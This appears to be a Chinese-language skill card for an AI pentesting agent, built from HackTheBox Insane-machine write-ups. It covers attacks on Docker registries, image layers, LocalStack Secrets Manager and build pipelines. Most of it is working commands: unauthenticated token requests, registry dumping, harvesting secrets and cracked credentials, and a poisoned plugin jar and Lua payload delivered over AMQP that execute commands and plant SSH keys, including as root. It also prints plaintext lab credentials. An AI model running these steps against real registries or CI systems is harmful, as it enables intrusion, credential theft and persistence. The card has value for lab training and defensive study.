---
name: 'supply-chain-artifact-attacks'
description: 'nmap 报 Docker Registry (API: 2.0) / 5000 端口返回 www-authenticate、或主机上摆着 awslocal/aws CLI 与 LocalStack、或应用自身有「构建→产出 jar/plugin→被别的服务加载」的链路时加载:制品仓库是应用源码与密钥的平行副本,通常比运行中的应用更疏于保护。打 token 换 _catalog、弱认证拉镜像、逐层 dump、secrets manager 翻 CI 凭据、构建产物投毒。（检索词：docker registry/docker-registry/registry/_catalog/Docker-Distribution-Api-Version/registry:catalog:*/DockerRegistryGrabber/drg.py/www-authenticate/Basic realm/镜像层/image layer/制品仓库/artifact/build artifact/构建产物/supply chain/supply-chain/供应链/CI/CD/jenkins/Jenkins/secretsmanager/Secrets Manager/awslocal/localstack/构建流水线/凭据仓库/源码泄露/attacks）'
whenToUse: '看到 registry 端口、私有制品仓库、LocalStack/aws CLI 或 CI 产物链路时加载;镜像里的源码转 java-native-deserialization / credential-hunting-locations,进容器转 container-escape'
metadata: { domain: cloud, tier: T2 }
---

# 制品仓库与构建流水线作为攻击面

> 来自 Insane 官方 WP 逐台回核,**5 台命中**:RegistryTwo / MagicGardens / Sorcery / Sink / Dyplesher

🔑 **制品仓库是应用的平行副本:同样的源码、配置、密钥,门锁常差一档。** 线上打不动时先问:镜像/产物存在哪、谁能拉。

## 触发信号

- nmap 指纹写 `Docker Registry (API: 2.0)`(5000),头带 `Docker-Distribution-Api-Version`
- 5000/5001 成对:5001 是 auth server,`/auth` 匿名也回 `access_token`
- 401 带 `Www-Authenticate: Bearer realm=...,service=...,scope="registry:catalog:*"`
- 401 带 `www-authenticate: Basic realm="Registry Realm"`
- 主机有 `awslocal`/`aws`,或脚本里写着 `http://127.0.0.1:4566`
- 面板有 Add Plugin / Reload Plugin / Console;源码出现 `out/artifacts`

## 前置验证

```bash
curl -i -k https://TARGET:5000/v2/_catalog   # realm 类型决定模式1/2
curl -i -k https://TARGET:5001/auth
which awslocal aws docker; curl -s http://127.0.0.1:4566/health
```

## 模式 1: 5000/5001 双端口 —— 换 token 再列镜像

条件:走 Bearer 但 `/auth` 不校验身份。🔴 **scope 和 service 必须一起写进 URL**,否则 token 查 `_catalog` 仍是 401。

```bash
http --verify no 'https://webhosting.htb:5001/auth'      # 200,但无权
# 401 头给出 realm/service/scope:Www-Authenticate: Bearer realm="...:5001/auth",
#   service="Docker registry",scope="registry:catalog:*",error="invalid_token"
http --verify no 'https://webhosting.htb:5001/auth?scope=registry:catalog:*&service=Docker+registry'
http --verify no 'https://webhosting.htb:5000/v2/_catalog' 'Authorization: bearer <access_token>'
# → {"repositories": ["hosting-app"]}
docker pull webhosting.htb:5000/hosting-app   # 自签证书需先 update-ca-certificates,否则报 x509
docker container create --name registrytwo 2109cc177231 && docker container start registrytwo
docker exec -it -u 0 registrytwo sh        # 镜像内通常是 root
docker cp registrytwo:/usr/local/tomcat/webapps/hosting.war . && jd-gui hosting.war
docker cp registrytwo:/usr/local/tomcat/webapps/hosting/WEB-INF/classes/com .
```

| 机器 | 细节 |
|------|------|
| RegistryTwo | 5000 registry + 5001 auth;`scope=registry:catalog:*` 换 token 后 `_catalog` 得 `hosting-app`;`docker cp` 出 `hosting.war` → jd-gui 见 `mysql.host` 拼进 jdbc url(8.0.17)→ 恶意 MySQL + ysoserial `CommonsCollections5` 反弹 shell;再打 Java RMI `FileService` 拿伪 shell |

## 模式 2: 弱认证 registry —— 凭据复用 + 抓取器

条件:401 是 `Basic realm="Registry Realm"`(非 Bearer)。**registry 口令几乎就是站点/htpasswd 那把**。

```bash
curl -i -k https://10.129.231.24:5000/v2/_catalog
# HTTP/2 401 / docker-distribution-api-version: registry/2.0
# www-authenticate: Basic realm="Registry Realm"
curl -k -i https://magicgardens.htb:5000/v2/_catalog -u AlexMiles:diamonds
# HTTP/2 200 → {"repositories":["magicgardens.htb"]}
python3 drg.py -p 5000 --dump magicgardens.htb -U AlexMiles -P diamonds   # DockerRegistryGrabber
for i in $(ls); do tar -xvzf $i; done && cd ./usr/src/app/ && ls -al    # .env app/settings.py
```

| 机器 | 细节 |
|------|------|
| MagicGardens | `auth.zip` → zip2john 出 `realmadrid` → htpasswd 里 `AlexMiles` bcrypt → john 出 `diamonds` → 同对凭据在 `:5000/v2/_catalog` 上 200;`drg.py` dump 32 层,`.env`+`settings.py` 泄 `SECRET_KEY` 与 `PickleSerializer` → Django 反序列化进容器,再靠 `cap_sys_module` 逃逸 |

## 模式 3: 逐层 dump 镜像层（`_catalog` 用 curl,层体用 `drg.py --dump`）

条件:目标机上没 docker CLI。每层是一个 tar.gz blob。

```bash
curl -u 'rebecca_smith:-7eAZDp9-f9mg699914' http://localhost:5000/v2/_catalog
# {"repositories":["test-domain-workstation"]}
python3 drg.py http://localhost --dump test-domain-workstation -U rebecca_smith -P'-7eAZDp9-f9mg699914'
# [+] BlobSum found 10
tar -vtf 292e59a87dfb0fb3787c3889e4c1b81bfef0cd2f3378c61f281a4c7a02ad1787.tar.gz
tar -xf *.tar.gz && cat docker-entrypoint.sh
```

🔴 凭据常在 entrypoint 而非配置文件:`ipa-client-install`/`docker login` 的参数就是明文口令。

| 机器 | 细节 |
|------|------|
| Sorcery | `sudo -l` 允许 `(rebecca_smith) NOPASSWD: /usr/bin/docker login` + `strace -s 128 -p [0-9]*`,`ptrace_scope=0` → strace 抓到 `{"Username":"rebecca_smith","Secret":"-7eAZDp9-f9mg"}`;账号带 OTP,反编译 .NET 得 `new Random(DateTime.Now.Minute/10 + 2003).Next(100000, 999999)` 复现 `699914`,拼成 `-7eAZDp9-f9mg699914` 后 curl 登录,dump 出 `--principal donna_adams --password 3FEVPCT_c3xDH` |

## 模式 4: CI 凭据在 secrets manager / 日志里

条件:能跑 `awslocal`(LocalStack,`http://127.0.0.1:4566`)。🔴 **先枚举日志拿服务名,再取 secret**,顺序反了不知道 secret 叫什么。

```bash
awslocal logs describe-log-groups
awslocal logs describe-log-streams --log-group-name cloudtrail
awslocal logs get-log-events --log-group-name cloudtrail --log-stream-name 20201222
# 事件里见 RotateSecret / RestoreSecret → 确认 SecretsManager 在用
awslocal secretsmanager list-secrets
awslocal secretsmanager get-secret-value --secret-id 'Jenkins Login'
awslocal secretsmanager get-secret-value --secret-id 'Sink Panel'
awslocal secretsmanager get-secret-value --secret-id 'Jira Support'
```

| 机器 | 细节 |
|------|------|
| Sink | `create_logs.php` 指向 `http://127.0.0.1:4566`;`get-log-events --log-group-name cloudtrail --log-stream-name 20201222` 见 `RotateSecret`;`Jira Support` 的口令对 `david` 复用成功;`servers.enc` 用 KMS `RSAES_OAEP_SHA_256` 解密 → gzip → tar → `servers.yml` 口令提到 root |

## 模式 5: 构建产物作为投递载体

条件:应用自己「构建 → 产出 jar/plugin → 交给别的进程加载」。产物路径固定,内容由你定。

```bash
# Dyplesher 面板:Add Plugin / Reload Plugin / Console
name: exploit
main: com.rylinaux.plugman.exploit
# IDE:Build > Build Artifacts > Build → 产物落在 out > artifacts 下的 exploit.jar
# 上传 Add Plugin 页 → Reload Plugin 页只填 exploit(不带 .jar) → Console 看回显
# onEnable() 里换 ProcessBuilder 执行命令,或 FileWriter 直写 authorized_keys
```

第二种形态:把产物 URL 发到消息队列,由 root 侧消费者拉取。

```python
credentials = pika.PlainCredentials('yuntao','EashAnicOc3Op')
channel.basic_publish(exchange='plugin_data', routing_key='', body='http://127.0.0.1:8000/test.lua')
```

| 机器 | 细节 |
|------|------|
| Dyplesher | 面板管 Paper MC/Spigot 插件:`Build > Build Artifacts > Build` 产出 `out > artifacts` 下 `exploit.jar` → 上传 → Reload Plugin → `ProcessBuilder` 读 `/etc/passwd`,改 `FileWriter` 写 `MinatoTW` 的 `authorized_keys`;提权段 root 每分钟跑 cuberite lua,用 pika 把 `test.lua` 的 URL publish 到 `plugin_data` exchange → 写 `/root/.ssh/authorized_keys` |

## 快速检查清单

```bash
[ ] curl -i -k https://TARGET:5000/v2/_catalog → 记 realm 类型
[ ] Bearer → 带 scope=registry:catalog:* 与 service= 重新换 token
[ ] 有 docker 就 pull + container create/start + docker cp;没有就 drg.py --dump
[ ] 解包后先看 entrypoint/部署脚本,再 grep SECRET_KEY|password|token
[ ] awslocal/aws → logs describe-log-groups → get-log-events → secretsmanager get-secret-value
```

## 教训

1. **镜像 = 源码 + 配置 + 密钥的平行副本**,线上打不动时先拉镜像反编译。
2. 🔴 **registry 口令常与站点/htpasswd/entrypoint 的 `--password` 是同一把。**
3. **构建产物是信任边界**:服务端加载你产出的 jar/lua,等于用那个进程的权限执行你的代码。

## 相关卡

- `container-escape` —— 从镜像进容器且拿到 RCE 之后(cap_sys_module/特权挂载)
- `credential-hunting-locations` —— 镜像或主机里翻到源码/配置后系统化找下一组凭据
- `java-native-deserialization` —— WAR 反编译出可控 `readObject()` 或 jdbc url
- `internal-rpc-broker-attacks` —— AMQP/Kafka 裸端口消费与发布(插件 URL 投递通道)
